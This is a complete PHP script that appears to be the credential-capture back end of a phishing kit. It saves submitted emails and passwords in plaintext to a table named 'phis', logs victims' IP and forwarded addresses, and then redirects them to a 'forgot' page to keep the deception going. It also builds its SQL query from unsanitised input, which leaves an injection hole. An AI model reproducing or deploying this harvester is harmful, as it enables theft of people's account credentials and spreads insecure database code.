<?php

require_once('../db-connection.php');
$t = time();
$email = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$proxIp = $_SERVER['HTTP_X_FORWARDED_FOR'];
$time = date("Y-m-d",$t);
$query = "INSERT INTO `phis`(`Email`, `Password`, `Time`,`ip`,`ProxIp`) VALUES ('$email','$password','$time','$ip','$proxIp')";


$link->query($query);
$email = $_POST['email'];
header ('Location:forgot/index.php?email='.$email);
exit;

?>
